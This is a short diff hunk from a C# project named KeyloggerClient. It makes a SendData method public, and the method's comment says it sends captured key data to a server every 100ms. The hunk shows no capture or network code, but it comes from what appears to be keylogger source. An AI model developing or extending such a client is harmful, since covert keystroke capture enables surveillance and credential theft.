@@ -137,7 +137,7 @@ namespace KeyloggerClient
         /// Sends captured key data to the server every 100ms if there is data to send.
         /// </summary>
         /// <returns>A Task representing the asynchronous send operation.</returns>
-        private async Task SendData()
+        public async Task SendData()
         {
             if ((DateTime.Now - lastSend).TotalMilliseconds >= 100 && keyBuffer.Length > 0)
             {
